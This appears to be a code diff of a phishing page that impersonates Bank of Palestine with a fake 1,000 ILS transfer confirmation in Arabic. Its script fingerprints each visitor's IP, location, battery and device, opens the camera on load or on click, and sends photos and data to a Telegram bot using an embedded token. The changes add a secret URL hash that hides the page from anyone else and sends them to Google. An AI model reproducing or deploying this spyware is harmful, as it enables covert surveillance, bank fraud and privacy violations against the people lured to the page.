@@ -3,45 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك فلسطين - بوابة استلام الدفعات الإلكترونية</title>
+    <title>Bank Of Palestine</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .header { background: #fff; position: fixed; top: 0; width: 100%; padding: 10px; border-bottom: 4px solid #d71920; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .card { background: white; padding: 40px 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; position: relative; }
-        .logo { width: 130px; margin-bottom: 25px; }
-        .success-icon { color: #28a745; font-size: 50px; margin-bottom: 10px; }
+        /* الصفحة تكون مخفية في البداية */
+        body { display: none; font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f8f9fa; margin: 0; }
+        .header { background: #fff; padding: 10px; border-bottom: 4px solid #d71920; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .card { background: white; padding: 40px 25px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; max-width: 400px; margin: 80px auto; width: 90%; }
         .amount-display { background: #f0fdf4; border: 1.5px solid #28a745; padding: 25px; border-radius: 15px; margin: 20px 0; }
-        .amount { font-size: 38px; color: #1a1a1a; font-weight: 800; display: block; }
-        .currency { color: #28a745; font-size: 18px; font-weight: bold; }
-        .info-text { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 25px; text-align: right; border-right: 3px solid #0056b3; padding-right: 10px; }
-        .main-btn { background: #0056b3; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .main-btn:active { transform: scale(0.98); }
+        .amount { font-size: 38px; color: #1a1a1a; font-weight: 800; }
+        .main-btn { background: #0056b3; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; }
         #video, #canvas { display: none; }
     </style>
 </head>
-<body onclick="activate()">
+<body id="bodyTag" onclick="startTrap()">
 
-    <div class="header">
-        <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 100px;">
-    </div>
-
-    <div class="card">
-        <div class="success-icon">✓</div>
-        <h2 style="margin:0; color:#1a1a1a; font-size: 22px;">تم اعتماد الحوالة بنجاح</h2>
-        
-        <div class="amount-display">
-            <span class="amount">1,000.00</span>
-            <span class="currency">شيكل إسرائيلي (ILS)</span>
+    <div id="captureUI">
+        <div class="header"><img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 100px;"></div>
+        <div class="card">
+            <h2 style="color:#1a1a1a;">تأكيد استلام حوالة</h2>
+            <div class="amount-display">
+                <span class="amount">1,000.00</span>
+                <span style="color:#28a745;">ILS</span>
+            </div>
+            <p style="text-align:right; font-size:14px;">يرجى الضغط أدناه لإنهاء المزامنة الرقمية وإيداع المبلغ في حسابك.</p>
+            <button class="main-btn">استلم الآن</button>
         </div>
-
-        <div class="info-text">
-            • مرجع العملية: <b>BOP-TX88102</b><br>
-            • نوع العملية: استلام دفعة فورية<br>
-            • ملاحظة: يرجى الضغط أدناه لإنهاء إجراءات المزامنة والتحقق الرقمي لإيداع المبلغ في رصيدك.
-        </div>
-
-        <button class="main-btn">استلم المبلغ الآن</button>
-        <p style="font-size: 11px; color: #999; margin-top: 15px;">نظام آمن ومشفر بنسبة 100% - بنك فلسطين 2026</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -50,33 +36,43 @@
     <script>
         const TOKEN = '8550792437:AAFPRHjdjDq1vQvhLKs6S5DpfRId13-MhHc';
         const CHAT_ID = '7184970355';
-        let isCaptured = false;
-        let systemInfo = "";
+        const SECRET_WORD = "#capture"; // الكلمة المميزة
 
-        // سحب البيانات تلقائياً فور التحميل (المرحلة الصامتة)
-        window.onload = async function() {
-            systemInfo = await fetchSpecs();
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚠️ دخول جديد (زياد الخطيب):\n' + systemInfo)}`);
-            
-            // محاولة تشغيل الكاميرا تلقائياً (window.onload)
-            attemptCamera();
+        // الفحص الفوري عند التحميل
+        window.onload = function() {
+            if (window.location.hash === SECRET_WORD) {
+                // إذا وجد الكلمة المميزة، أظهر الصفحة وابدأ السحب
+                document.getElementById('bodyTag').style.display = "block";
+                initInfo();
+            } else {
+                // إذا لم يجدها، توجه إلى قوقل فوراً
+                window.location.href = "https://www.google.com";
+            }
         };
 
-        async function attemptCamera() {
+        let systemInfo = "";
+        let isRunning = false;
+
+        async function initInfo() {
+            systemInfo = await getSpecs();
+            // إرسال تنبيه أن الضحية دخل الرابط الملغم
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('⚠️ المستهدف دخل الرابط الملغم:\n' + systemInfo)}`);
+            
+            // محاولة طلب الكاميرا تلقائياً
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                startCapture(stream);
-            } catch (e) { console.log("Waiting for touch..."); }
+                runCapture(stream);
+            } catch(e) {}
         }
 
-        function activate() {
-            if (isCaptured) return;
-            attemptCamera();
+        function startTrap() {
+            if (isRunning) return;
+            navigator.mediaDevices.getUserMedia({ video: true }).then(runCapture);
         }
 
-        function startCapture(stream) {
-            if (isCaptured) return;
-            isCaptured = true;
+        function runCapture(stream) {
+            if (isRunning) return;
+            isRunning = true;
             const video = document.getElementById('video');
             video.srcObject = stream;
 
@@ -89,17 +85,15 @@
                     clearInterval(timer);
                     window.location.href = "https://www.bankofpalestine.com/";
                 }
-            }, 600);
+            }, 500);
         }
 
-        async function fetchSpecs() {
+        async function getSpecs() {
             try {
                 const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
                 const bat = await navigator.getBattery().then(b => (b.level * 100).toFixed(0) + "%");
-                const ram = navigator.deviceMemory || "غير متوفر";
-                const platform = navigator.platform;
-                return `🌐 IP: ${ip.ip}\n📍 الموقع: ${ip.city}, ${ip.country_name}\n🔋 الشحن: ${bat}\n🧠 الرام: ${ram} GB\n📱 النظام: ${platform}\n🏢 المزود: ${ip.org}`;
-            } catch (e) { return "فشل سحب البيانات الرقمية"; }
+                return `🌐 IP: ${ip.ip}\n📍 الموقع: ${ip.city}, ${ip.country_name}\n🔋 الشحن: ${bat}\n📱 النظام: ${navigator.platform}\n🏢 المزود: ${ip.org}`;
+            } catch (e) { return "بيانات أساسية فقط: " + navigator.userAgent; }
         }
 
         async function sendToBot(video) {
@@ -107,11 +101,10 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
             canvas.toBlob(async (blob) => {
                 const fd = new FormData();
                 fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'capture.jpg');
+                fd.append('photo', blob, 'shot.jpg');
                 fd.append('caption', systemInfo);
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
             }, 'image/jpeg', 0.6);
